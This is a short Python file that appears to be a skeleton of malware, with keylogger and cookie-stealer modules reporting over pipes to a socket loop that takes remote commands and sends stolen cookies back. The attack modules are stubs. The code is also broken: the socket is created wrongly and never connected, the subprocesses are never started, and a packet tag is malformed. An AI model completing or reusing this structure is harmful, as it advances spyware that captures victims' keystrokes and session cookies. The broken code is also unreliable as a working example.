import multiprocessing as mp
import socket

def create_packet(module, data):
	return "<module>" + module + "</module><data>" + data + "/data>"

def keylogger(pipe):
	pipe.send("test")

def cookie_stealer(pipe):
	pipe.send("test")

sock = socket()

keylogger_child, keylogger_parent = mp.Pipe()
cookie_stealer_child, cookie_stealer_parent = mp.Pipe()

# Start sub processes

keylogger_process = mp.Process(target=keylogger, args=(keylogger_child,))
cookie_stealer_process = mp.Process(target=cookie_stealer, args=(cookie_stealer_child,))


while True:
	# Receive commands
	data = sock.recv(1024)

	if (len(data) > 0):
		if (str(data) == "cookies"):
			cookie_stealer_parent.send("get_cookies")

	while keylogger_parent.poll():
		data = keylogger_parent.recv()

	while cookie_stealer_parent.poll():
		data = cookie_stealer_parent.recv()

		sock.send(create_packet("cookies", data))
